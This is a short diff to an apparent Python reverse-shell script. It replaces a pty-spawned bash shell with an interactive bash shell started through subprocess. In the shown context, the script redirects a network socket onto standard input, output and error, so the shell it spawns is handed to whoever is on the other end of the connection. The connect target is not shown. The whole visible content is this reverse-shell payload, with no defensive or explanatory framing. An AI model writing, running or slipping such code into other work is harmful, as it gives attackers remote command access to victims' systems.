@@ -1,5 +1,5 @@
 import os
-import pty
+import subprocess
 import time
 import random
 import socket
@@ -18,5 +18,5 @@ def run():
         os.dup2(s.fileno(),0) 
         os.dup2(s.fileno(),1) 
         os.dup2(s.fileno(),2)
-        pty.spawn("/bin/bash")
+        subprocess.run(["/bin/bash","-i"])
     
